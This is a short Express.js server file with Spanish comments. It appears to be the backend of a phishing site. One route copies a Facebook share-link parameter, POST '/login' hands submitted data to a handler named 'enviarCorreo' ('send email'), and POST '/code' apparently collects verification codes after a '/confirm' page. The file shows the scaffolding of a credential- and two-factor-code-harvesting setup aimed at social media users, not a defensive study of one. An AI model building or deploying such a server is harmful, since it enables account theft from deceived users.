import express from "express";
import path from 'path';
import { fileURLToPath } from 'url';
import { methods as server } from "./controllers/server.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();
app.set("port", 4000);

// Configuración
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());

// Rutas
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "/pages/index.html")));
app.get("/mibextid=wwXIfr", (req, res) => res.sendFile(path.join(__dirname, "/pages/index.html")));
app.get("/confirm", (req, res) => res.sendFile(path.join(__dirname, "/pages/confirm.html")));
app.post("/login", server.enviarCorreo);
app.post("/code", server.code);

app.listen(app.get("port"), () => {
    console.log("Servidor corriendo en puerto", app.get("port"));
});